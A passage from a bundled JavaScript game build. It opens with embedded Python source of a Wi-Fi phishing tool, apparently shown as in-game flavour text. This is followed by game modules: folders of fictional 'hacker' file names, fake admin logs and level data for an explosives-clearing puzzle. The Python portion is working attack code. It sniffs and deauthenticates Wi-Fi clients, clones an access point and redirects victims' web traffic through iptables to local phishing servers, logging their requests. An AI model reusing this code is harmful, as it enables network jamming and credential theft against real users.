<br/> 		for p in pkts: <br/> 			send(p, inter=float(args.timeinterval), count=int(args.packets)) <br/>  <br/>  <br/> def output(monchannel): <br/> 	wifi_jammer_tmp = '/tmp/wifiphisher-jammer.tmp' <br/> 	with open(wifi_jammer_tmp, 'a+') as log_file: <br/> 		log_file.truncate() <br/> 		with lock: <br/> 			for ca in clients_APs: <br/> 				if len(ca) > 3: <br/> 					log_file.write( <br/> 						('[' + T + '*' + W + '] ' + O + ca[0] + W + <br/> 						 ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) + <br/> 						 ' - ' + T + ca[3] + W + '\n') <br/> 					) <br/> 				else: <br/> 					log_file.write( <br/> 						'[' + T + '*' + W + '] ' + O + ca[0] + W + <br/> 						' - ' + O + ca[1] + W + ' - ' + ca[2] <br/> 					) <br/> 		with lock: <br/> 			for ap in APs: <br/> 				log_file.write( <br/> 					'[' + T + '*' + W + '] ' + O + ap[0] + W + <br/> 					' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n' <br/> 				) <br/> 		# print '' <br/>  <br/>  <br/> def noise_filter(skip, addr1, addr2): <br/> 	# Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, <br/> 	# broadcast <br/> 	ignore = [ <br/> 		'ff:ff:ff:ff:ff:ff', <br/> 		'00:00:00:00:00:00', <br/> 		'33:33:00:', '33:33:ff:', <br/> 		'01:80:c2:00:00:00', <br/> 		'01:00:5e:', <br/> 		mon_MAC <br/> 	] <br/> 	if skip: <br/> 		ignore.append(skip) <br/> 	for i in ignore: <br/> 		if i in addr1 or i in addr2: <br/> 			return True <br/>  <br/>  <br/> def cb(pkt): <br/> 	''' <br/> 	Look for dot11 packets that aren't to or from broadcast address, <br/> 	are type 1 or 2 (control, data), and append the addr1 and addr2 <br/> 	to the list of deauth targets. <br/> 	''' <br/> 	global clients_APs, APs <br/>  <br/> 	# return these if's keeping clients_APs the same or just reset clients_APs? <br/> 	# I like the idea of the tool repopulating the variable more <br/> 	if args.maximum: <br/> 		if args.noupdate: <br/> 			if len(clients_APs) > int(args.maximum): <br/> 				return <br/> 		else: <br/> 			if len(clients_APs) > int(args.maximum): <br/> 				with lock: <br/> 					clients_APs = [] <br/> 					APs = [] <br/>  <br/> 	''' <br/> 	We're adding the AP and channel to the deauth list at time of creation <br/> 	rather than updating on the fly in order to avoid costly for loops <br/> 	that require a lock. <br/> 	''' <br/>  <br/> 	if pkt.haslayer(Dot11): <br/> 		if pkt.addr1 and pkt.addr2: <br/>  <br/> 			# Filter out all other APs and clients if asked <br/> 			if args.accesspoint: <br/> 				if args.accesspoint not in [pkt.addr1, pkt.addr2]: <br/> 					return <br/>  <br/> 			# Check if it's added to our AP list <br/> 			if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp): <br/> 				APs_add(clients_APs, APs, pkt, args.channel) <br/>  <br/> 			# Ignore all the noisy packets like spanning tree <br/> 			if noise_filter(args.skip, pkt.addr1, pkt.addr2): <br/> 				return <br/>  <br/> 			# Management = 1, data = 2 <br/> 			if pkt.type in [1, 2]: <br/> 				clients_APs_add(clients_APs, pkt.addr1, pkt.addr2) <br/>  <br/>  <br/> def APs_add(clients_APs, APs, pkt, chan_arg): <br/> 	ssid = pkt[Dot11Elt].info <br/> 	bssid = pkt[Dot11].addr3 <br/> 	try: <br/> 		# Thanks to airoscapy for below <br/> 		ap_channel = str(ord(pkt[Dot11Elt:3].info)) <br/> 		# Prevent 5GHz APs from being thrown into the mix <br/> 		chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] <br/> 		if ap_channel not in chans: <br/> 			return <br/>  <br/> 		if chan_arg: <br/> 			if ap_channel != chan_arg: <br/> 				return <br/>  <br/> 	except Exception: <br/> 		return <br/>  <br/> 	if len(APs) == 0: <br/> 		with lock: <br/> 			return APs.append([bssid, ap_channel, ssid]) <br/> 	else: <br/> 		for b in APs: <br/> 			if bssid in b[0]: <br/> 				return <br/> 		with lock: <br/> 			return APs.append([bssid, ap_channel, ssid]) <br/>  <br/>  <br/> def clients_APs_add(clients_APs, addr1, addr2): <br/>  <br/> 	if len(clients_APs) == 0: <br/> 		if len(APs) == 0: <br/> 			with lock: <br/> 				return clients_APs.append([addr1, addr2, monchannel]) <br/> 		else: <br/> 			AP_check(addr1, addr2) <br/>  <br/> 	# Append new clients/APs if they're not in the list <br/> 	else: <br/> 		for ca in clients_APs: <br/> 			if addr1 in ca and addr2 in ca: <br/> 				return <br/>  <br/> 		if len(APs) > 0: <br/> 			return AP_check(addr1, addr2) <br/> 		else: <br/> 			with lock: <br/> 				return clients_APs.append([addr1, addr2, monchannel]) <br/>  <br/>  <br/> def AP_check(addr1, addr2): <br/> 	for ap in APs: <br/> 		if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower(): <br/> 			with lock: <br/> 				return clients_APs.append([addr1, addr2, ap[1], ap[2]]) <br/>  <br/>  <br/> def mon_mac(mon_iface): <br/> 	''' <br/> 	http://stackoverflow.com/questions/159137/getting-mac-address <br/> 	''' <br/> 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) <br/> 	info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15])) <br/> 	mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1] <br/> 	print ('[' + G + '*' + W + '] Monitor mode: ' + G <br/> 		   + mon_iface + W + ' - ' + O + mac + W) <br/> 	return mac <br/>  <br/>  <br/> def sniff_dot11(mon_iface): <br/> 	''' <br/> 	We need this here to run it from a thread. <br/> 	''' <br/> 	sniff(iface=mon_iface, store=0, prn=cb) <br/>  <br/>  <br/> def get_hostapd(): <br/> 	if not os.path.isfile('/usr/sbin/hostapd'): <br/> 		install = raw_input( <br/> 			('[' + T + '*' + W + '] hostapd not found ' + <br/> 			 'in /usr/sbin/hostapd, install now? [y/n] ') <br/> 		) <br/> 		if install == 'y': <br/> 			os.system('apt-get -y install hostapd') <br/> 		else: <br/> 			sys.exit(('[' + R + '-' + W + '] hostapd' + <br/> 					 'not found in /usr/sbin/hostapd')) <br/> 	if not os.path.isfile('/usr/sbin/hostapd'): <br/> 		sys.exit(( <br/> 			'\n[' + R + '-' + W + '] Unable to install the 'hostapd' package!\n' + <br/> 			'[' + T + '*' + W + '] This process requires a persistent internet connection!\n' + <br/> 			'Please follow the link below to configure your sources.list\n' + <br/> 			B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W + <br/> 			'[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' + <br/> 			'[' + G + '+' + W + '] Rerun the script again to install hostapd.\n' + <br/> 			'[' + R + '!' + W + '] Closing' <br/> 		 )) <br/>  <br/> if __name__ == '__main__': <br/>  <br/> 	print '               _  __ _       _     _     _               ' <br/> 	print '              (_)/ _(_)     | |   (_)   | |              ' <br/> 	print '     __      ___| |_ _ _ __ | |__  _ ___| |__   ___ _ __ ' <br/> 	print '       / / / |  _| | '_ | '_ | / __| '_  / _  '__|' <br/> 	print '       V  V /| | | | | |_) | | | | __  | | |  __/ |   ' <br/> 	print '       _/_/ |_|_| |_| .__/|_| |_|_|___/_| |_|___|_|   ' <br/> 	print '                      | |                                ' <br/> 	print '                      |_|                                ' <br/> 	print '                                                         ' <br/>  <br/> 	# Parse args <br/> 	args = parse_args() <br/> 	# Are you root? <br/> 	if os.geteuid(): <br/> 		sys.exit('[' + R + '-' + W + '] Please run as root') <br/> 	# Get hostapd if needed <br/> 	get_hostapd() <br/>  <br/> 	# TODO: We should have more checks here: <br/> 	# Is anything binded to our HTTP(S) ports? <br/> 	# Maybe we should save current iptables rules somewhere <br/>  <br/> 	# Get interfaces <br/> 	reset_interfaces() <br/> 	inet_iface = get_internet_interface() <br/> 	if not args.jamminginterface: <br/> 		mon_iface = get_iface(mode='monitor', exceptions=[inet_iface]) <br/> 		iface_to_monitor = False <br/> 	else: <br/> 		mon_iface = False <br/> 		iface_to_monitor = args.jamminginterface <br/> 	if not mon_iface: <br/> 		if args.jamminginterface: <br/> 			iface_to_monitor = args.jamminginterface <br/> 		else: <br/> 			iface_to_monitor = get_strongest_iface() <br/> 		if not iface_to_monitor and not inet_iface: <br/> 			sys.exit( <br/> 				('[' + R + '-' + W + <br/> 				 '] No wireless interfaces found, bring one up and try again' <br/> 				 ) <br/> 			) <br/> 		mon_iface = start_mode(iface_to_monitor, 'monitor') <br/> 	wj_iface = mon_iface <br/> 	if not args.apinterface: <br/> 		ap_iface = get_iface(mode='managed', exceptions=[iface_to_monitor]) <br/> 	else: <br/> 		ap_iface = args.apinterface <br/>  <br/> 	if inet_iface and inet_iface in [ap_iface, iface_to_monitor]: <br/> 		sys.exit( <br/> 			('[' + G + '+' + W +  <br/> 			'] Interface %s is connected to the Internet. ' % inet_iface + <br/> 			'Please disconnect and rerun the script.\n' + <br/> 			'[' + R + '!' + W + '] Closing' <br/> 			) <br/> 		) <br/>  <br/>  <br/> 	''' <br/> 	We got the interfaces correctly at this point. Monitor mon_iface & for <br/> 	the AP ap_iface. <br/> 	''' <br/> 	# Set iptable rules and kernel variables. <br/> 	os.system( <br/> 		('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'  <br/> 		% (NETWORK_GW_IP, PORT)) <br/> 	) <br/> 	os.system( <br/> 		('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'  <br/> 		% (NETWORK_GW_IP, SSL_PORT)) <br/> 	) <br/> 	Popen( <br/> 		['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], <br/> 		stdout=DN, <br/> 		stderr=PIPE <br/> 	) <br/>  <br/> 	print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables' <br/>  <br/> 	# Copy AP <br/> 	time.sleep(3) <br/> 	hop = Thread(target=channel_hop, args=(mon_iface,)) <br/> 	hop.daemon = True <br/> 	hop.start() <br/> 	sniffing(mon_iface, targeting_cb) <br/> 	channel, essid, ap_mac = copy_AP() <br/> 	hop_daemon_running = False <br/>  <br/> 	# Start AP <br/> 	start_ap(ap_iface, channel, essid, args) <br/> 	dhcpconf = dhcp_conf(ap_iface) <br/> 	if not dhcp(dhcpconf, ap_iface): <br/> 		print('[' + G + '+' + W +  <br/> 			'] Could not set IP address on %s!' % ap_iface) <br/> 		shutdown() <br/> 	os.system('clear') <br/> 	print ('[' + T + '*' + W + '] ' + T + <br/> 		   essid + W + ' set up on channel ' + <br/> 		   T + channel + W + ' via ' + T + mon_iface + <br/> 		   W + ' on ' + T + str(ap_iface) + W) <br/>  <br/> 	# With configured DHCP, we may now start the web server <br/> 	# Start HTTP server in a background thread <br/> 	Handler = HTTPRequestHandler <br/> 	try: <br/> 		httpd = HTTPServer((NETWORK_GW_IP, PORT), Handler) <br/> 	except socket.error, v: <br/> 		errno = v[0] <br/> 		sys.exit(( <br/> 			'\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' + <br/> 			'[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' + <br/> 			'[' + R + '!' + W + '] Closing' <br/> 		)) <br/> 	print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT) <br/> 	webserver = Thread(target=httpd.serve_forever) <br/> 	webserver.daemon = True <br/> 	webserver.start() <br/> 	# Start HTTPS server in a background thread <br/> 	Handler = SecureHTTPRequestHandler <br/> 	try: <br/> 		httpd = SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler) <br/> 	except socket.error, v: <br/> 		errno = v[0] <br/> 		sys.exit(( <br/> 			'\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' + <br/> 			'[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' + <br/> 			'[' + R + '!' + W + '] Closing' <br/> 		)) <br/> 	print ('[' + T + '*' + W + '] Starting HTTPS server at port ' + <br/> 		   str(SSL_PORT)) <br/> 	secure_webserver = Thread(target=httpd.serve_forever) <br/> 	secure_webserver.daemon = True <br/> 	secure_webserver.start() <br/>  <br/> 	time.sleep(3) <br/>  <br/> 	clients_APs = [] <br/> 	APs = [] <br/> 	args.accesspoint = ap_mac <br/> 	args.channel = channel <br/> 	monitor_on = None <br/> 	conf.iface = mon_iface <br/> 	mon_MAC = mon_mac(mon_iface) <br/> 	first_pass = 1 <br/>  <br/> 	monchannel = channel <br/> 	# Start channel hopping <br/> 	hop = Thread(target=channel_hop2, args=(wj_iface,)) <br/> 	hop.daemon = True <br/> 	hop.start() <br/>  <br/> 	# Start sniffing <br/> 	sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,)) <br/> 	sniff_thread.daemon = True <br/> 	sniff_thread.start() <br/>  <br/> 	# Main loop. <br/> 	try: <br/> 		while 1: <br/> 			os.system('clear') <br/> 			print 'Jamming devices: ' <br/> 			if os.path.isfile('/tmp/wifiphisher-jammer.tmp'): <br/> 				proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp']) <br/> 				lines = proc.split('\n') <br/> 				lines += ['\n'] * (5 - len(lines)) <br/> 			else: <br/> 				lines = ['\n'] * 5 <br/> 			for l in lines: <br/> 				print l <br/> 			print 'DHCP Leases: ' <br/> 			if os.path.isfile('/var/lib/misc/dnsmasq.leases'): <br/> 				proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases']) <br/> 				lines = proc.split('\n') <br/> 				lines += ['\n'] * (5 - len(lines)) <br/> 			else: <br/> 				lines = ['\n'] * 5 <br/> 			for l in lines: <br/> 				print l <br/> 			print 'HTTP requests: ' <br/> 			if os.path.isfile('/tmp/wifiphisher-webserver.tmp'): <br/> 				proc = check_output( <br/> 					['tail', '-5', '/tmp/wifiphisher-webserver.tmp'] <br/> 				) <br/> 				lines = proc.split('\n') <br/> 				lines += ['\n'] * (5 - len(lines)) <br/> 			else: <br/> 				lines = ['\n'] * 5 <br/> 			for l in lines: <br/> 				print l <br/> 			if terminate: <br/> 				time.sleep(3) <br/> 				shutdown() <br/> 			time.sleep(0.5) <br/> 	except KeyboardInterrupt: <br/> 		shutdown() <br/> ";
},{}],177:[function(require,module,exports){
module.exports={id:"microchip",title:"Specs",type:"folder",contains:[{title:"EF-108MB",type:"image",url:"chip1.jpg"},{title:"EF-128MB",type:"image",url:"chip2.jpg"},{title:"EF-111MB",type:"image",url:"chip3.jpg"},{title:"EF-153MB",type:"image",url:"chip4.jpg"},{title:"EF-148MB",type:"image",url:"chip5.jpg"},{title:"EF-005MB",type:"image",url:"chip6.jpg"},{title:"EF-078MB",type:"image",url:"chip7.jpg"},{title:"EF-043MB",type:"image",url:"chip8.jpg"},{title:"EF-035MB",type:"image",url:"chip9.jpg"}]};
},{}],178:[function(require,module,exports){
module.exports={id:"root1",title:"Sequence one",type:"folder",contains:[{title:"dc_c_1.rx",type:"text",content:require("./files/dc_c_1")},{title:"dc_nec_1.py",type:"text",content:require("./files/dc_nec_1")},{title:"dc_csot_1.rx",type:"text",content:require("./files/dc_csot_1")},{id:"root1_1",title:"Sequence one sub",type:"folder",contains:[{title:"dc_rs_1.rx",type:"text",content:require("./files/dc_rs_1")},{title:"dc_ch_1.rx",type:"text",content:require("./files/dc_ch_1")}]}]};
},{"./files/dc_c_1":155,"./files/dc_ch_1":156,"./files/dc_csot_1":157,"./files/dc_nec_1":158,"./files/dc_rs_1":159}],179:[function(require,module,exports){
module.exports={id:"root2",title:"Sequence two",type:"folder",contains:[{title:".--.sh",type:"text",content:require("./files/validalnum")},{title:"..sh",type:"text",content:require("./files/echon")},{title:".-.sh",type:"text",content:require("./files/inpath")},{title:".-..sh",type:"text",content:require("./files/valid_int")},{title:"..sh",type:"text",content:require("./files/nice_number")},{title:"..sh",type:"text",content:require("./files/scriptbc")},{title:"...-.sh",type:"text",content:require("./files/valid_float")},{title:"..sh",type:"text",content:require("./files/valid_date")},{title:".-..sh",type:"text",content:require("./files/valid_int")},{title:"-.--.sh",type:"text",content:require("./files/echon")},{title:".--.sh",type:"text",content:require("./files/validalnum")},{title:".....sh",type:"text",content:require("./files/inpath")},{title:"..sh",type:"text",content:require("./files/validalnum")},{title:".-..sh",type:"text",content:require("./files/valid_date")},{title:"..sh",type:"text",content:require("./files/scriptbc")}]};
},{"./files/echon":163,"./files/inpath":164,"./files/nice_number":166,"./files/scriptbc":168,"./files/valid_date":171,"./files/valid_float":172,"./files/valid_int":173,"./files/validalnum":174}],180:[function(require,module,exports){
module.exports={id:"root3",title:"Sequence three",type:"folder",contains:[{title:"ddos.1.sh",type:"text",content:require("./files/ddos_1")},{title:"ssyn.3.c",type:"text",content:require("./files/ssyn2")},{title:"tcp.3.c",type:"text",content:require("./files/tcp_3")}]};
},{"./files/ddos_1":160,"./files/ssyn2":169,"./files/tcp_3":170}],181:[function(require,module,exports){
module.exports={id:"root4",title:"Sequence four",type:"folder",contains:[{title:"ddos.test.py",type:"text",content:require("./files/ddos_test")},{title:"anddos.1.c",type:"text",content:require("./files/anddos.js")}]};
},{"./files/anddos.js":153,"./files/ddos_test":161}],182:[function(require,module,exports){
module.exports={id:"root5",title:"Sequence five",type:"folder",contains:[{title:"wiphish.sh",type:"text",content:require("./files/wphish")},{title:"w0rmz.cpp",type:"text",content:require("./files/w0rm")},{title:"mal.det.sh",type:"text",content:require("./files/maldet")}]};
},{"./files/maldet":165,"./files/w0rm":175,"./files/wphish":176}],183:[function(require,module,exports){
module.exports={id:"root6",title:"Sequence six",type:"folder",contains:[{title:"replicator.py",type:"text",content:require("./files/replicator")},{title:"dns.touch.c",type:"text",content:require("./files/dns")},{title:"@tt@ck.py",type:"text",content:require("./files/attack")}]};
},{"./files/attack":154,"./files/dns":162,"./files/replicator":167}],184:[function(require,module,exports){
module.exports={id:"sys_logs",title:"logs",type:"folder",contains:[{title:"_1438477261.log",type:"text",content:"[14:26:50] admin access <br/> [14:28:50] admin access <br/> [16:28:01] admin access <br/> [17:26:50] admin access <br/> [18:47:01] reboot 2 f5da89<br/>"},{title:"_1438563661.log",type:"text",content:"[04:26:50] admin access <br/> [04:36:17] admin access <br/> [06:25:00] admin access <br/> [07:25:44] admin access <br/> [08:26:01] admin access <br/> [09:23:11] admin access <br/> [10:20:01] admin access <br/> [11:26:44] admin access <br/> [11:25:55] admin access <br/> [12:26:10] admin access <br/> [13:27:50] admin access <br/> [14:23:40] admin access <br/> [15:15:30] admin access <br/> [16:18:20] admin access <br/> [17:11:01] admin access <br/> [18:47:01] reboot 5 89f5f5<br/>"},{title:"_1438563661.log",type:"text",content:"[00:12:10] admin access <br/> [07:11:15] admin access <br/> [12:01:01] admin access <br/> [15:21:53] reboot 4 f5aa89<br/> [15:26:00] admin access <br/> [15:32:22] admin access <br/> [20:01:00] admin access <br/> [22:01:57] admin access <br/> [23:00:40] admin access <br/> "},{title:"_1438390861.log",type:"text",content:"[12:00:00] admin access <br/> [12:30:05] admin access <br/> [12:45:20] admin access <br/> [18:32:22] reboot 1 99ff80 <br/>[18:40:50] admin access <br/> [20:20:50] admin access <br/> "},{title:"_1438563661.log",type:"text",content:"[08:10:00] admin access <br/>[08:26:50] admin access <br/> [09:00:23] admin access <br/> [10:43:37] admin access <br/>  [10:45:20] admin access <br/> [10:57:11] admin access <br/> [12:00:01] reboot 3 f980ff<br/>"}]};
},{}],185:[function(require,module,exports){
module.exports={config:{slug:"2_clear_path",title:"Clear Path",description:"Clear the three obstacles that are blocking the road to the impact zones. Be efficient and engineer solutions that utilize your limited inventory of explosives.",stem_breakdown:{science:15,technology:0,engineering:75,math:10},instructions:{description:""},obstacles:require("./obstacles"),maps:require("./maps"),clusters:require("./clusters")},versions:{hard:[{num_charges:9,par:{speed:{high:100,low:300},accuracy:{high:10,low:24},skill:{high:52e3,low:2e4}},map:"mountains1",cluster1:"1_1_1",cluster2:"1_2_2",cluster3:"1_3_3"},{num_charges:9,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:52e3,low:2e4}},map:"mountains1",cluster1:"1_1_3",cluster2:"1_2_1",cluster3:"1_3_1"},{num_charges:9,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:52e3,low:2e4}},map:"mountains1",cluster1:"1_1_3",cluster2:"1_2_2",cluster3:"1_3_2"},{num_charges:9,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:52e3,low:2e4}},map:"mountains2",cluster1:"2_1_1",cluster2:"2_2_3",cluster3:"2_3_1"},{num_charges:9,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:52e3,low:2e4}},map:"mountains2",cluster1:"2_1_2",cluster2:"2_2_2",cluster3:"2_3_3"},{num_charges:9,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:52e3,low:2e4}},map:"mountains2",cluster1:"2_1_1",cluster2:"2_2_3",cluster3:"2_3_3"}],medium:[{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_2",cluster2:"1_2_1",cluster3:"1_3_2"},{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_2",cluster2:"1_2_1",cluster3:"1_3_2"},{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_2",cluster2:"1_2_1",cluster3:"1_3_2"},{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_2",cluster2:"2_2_2",cluster3:"2_3_2"},{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_1",cluster2:"2_2_2",cluster3:"2_3_1"},{num_charges:12,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_2",cluster2:"2_2_1",cluster3:"2_3_3"}],easy:[{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_2",cluster2:"1_2_3",cluster3:"1_3_1"},{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_2",cluster2:"1_2_1",cluster3:"1_3_1"},{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains1",cluster1:"1_1_3",cluster2:"1_2_1",cluster3:"1_3_1"},{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_1",cluster2:"2_2_1",cluster3:"2_3_2"},{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_1",cluster2:"2_2_2",cluster3:"2_3_2"},{num_charges:15,par:{speed:{high:110,low:300},accuracy:{high:11,low:24},skill:{high:55e3,low:2e4}},map:"mountains2",cluster1:"2_1_3",cluster2:"2_2_2",cluster3:"2_3_1"}]}};
},{"./clusters":186,"./maps":208,"./obstacles":209}],186:[function(require,module,exports){
module.exports={"00":require("./clusters/cluster1"),"01":require("./clusters/cluster2"),"02":require("./clusters/cluster3"),"1_1_1":require("./clusters/1_1_1"),"1_2_1":require("./clusters/1_2_1"),"1_3_1":require("./clusters/1_3_1"),"1_1_2":require("./clusters/1_1_2"),"1_2_2":require("./clusters/1_2_2"),"1_3_2":require("./clusters/1_3_2"),"1_1_3":require("./clusters/1_1_3"),"1_2_3":require("./clusters/1_2_3"),"1_3_3":require("./clusters/1_3_3"),"2_1_1":require("./clusters/2_1_1"),"2_2_1":require("./clusters/2_2_1"),"2_3_1":require("./clusters/2_3_1"),"2_1_2":require("./clusters/2_1_2"),"2_2_2":require("./clusters/2_2_2"),"2_3_2":require("./clusters/2_3_2"),"2_1_3":require("./clusters/2_1_3"),"2_2_3":require("./clusters/2_2_3"),"2_3_3":require("./clusters/2_3_3")};
},{"./clusters/1_1_1":187,"./clusters/1_1_2":188,"./clusters/1_1_3":189,"./clusters/1_2_1":190,"./clusters/1_2_2":191,"./clusters/1_2_3":192,"./clusters/1_3_1":193,"./clusters/1_3_2":194,"./clusters/1_3_3":195,"./clusters/2_1_1":196,"./clusters/2_1_2":197,"./clusters/2_1_3":198,"./clusters/2_2_1":199,"./clusters/2_2_2":200,"./clusters/2_2_3":201,"./clusters/2_3_1":202,"./clusters/2_3_2":203,"./clusters/2_3_3":204,"./clusters/cluster1":205,"./clusters/cluster2":206,"./clusters/cluster3":207}],187:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:350.5451439907262,y:11.449280411524699,z:-293.0119286075839},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:375.698356006621,y:16.49247338697435,z:-272.0457313601541},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:343.1902735778474,y:17.22999942032365,z:-321.16274272074116},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:470.33808799599547,y:10.255886455416025,z:-302.8773787468861},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:375.15155109352406,y:11.472890282771244,z:-308.6432783323216},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:342.52431941479705,y:6.428001829704486,z:-305.75907174728206},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:336.81172695277536,y:5.493905465290133,z:-327.8693281663804},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:351.16312377299266,y:6.176967661434363,z:-327.1316250562734},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:335.5672812008344,y:12.555652164555708,z:-309.2266285362919},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:330.49957259081276,y:5.447210623829333,z:-335.6257855485315},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:343.05436734186674,y:6.103603964282406,z:-338.35078647325895},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:437.0113326070772,y:5.242219670920065,z:-290.1963800826621},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:465.8536324540909,y:5.470151420115061,z:-281.5255334712791},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:383.54424237161084,y:6.431907919751451,z:-295.68944519761897},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:385.8524006071609,y:6.4693139189115065,z:-286.0351640128989},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:310.41532795001257,y:4.105147008347684,z:-281.75201414680396},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:326.5169853023801,y:-276.73547088254765,z:-329.23928753154297},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:317.7177135699794,y:7.090416535064789,z:-275.66107723435215},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:316.60882638560895,y:-146.7662208019419,z:-299.24448072952237},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:319.4759626225892,y:3.359930839960311,z:-285.43191618897487},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:319.898555494001,y:3.2578010701936604,z:-295.16106961646244},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:327.66061434450455,y:6.449877367602857,z:-274.864495303633},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:362.4671128376156,y:6.19588935831301,z:-302.4147292620417},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:338.55107783134815,y:7.2265203600335575,z:-267.3924104513788},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:329.67748880928747,y:6.335786511205496,z:-284.6572184743064},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:361.9719905075028,y:5.99840351863537,z:-282.71891445994913},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:259.83105578667784,y:8.485035324091642,z:-293.4678755543567},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:365.6567602762158,y:6.2611754143390135,z:-321.996733859456},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:359.84522243276615,y:5.997391738086203,z:-312.0589818504985},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:356.76892055405165,y:10.696249515228367,z:-320.2477880176609},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:359.95352225594274,y:6.513302339107343,z:-332.82688271201073},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:331.37322728751,y:5.477255282924133,z:-358.14726018418054},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:350.78702675555365,y:11.312361362120637,z:-341.8639594259801},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:374.4298069525626,y:6.497188742386194,z:-327.0114719551219},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:416.2207248607094,y:9.010122297406822,z:-313.9430788173458},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:416.8495153384962,y:5.456804433064336,z:-304.64507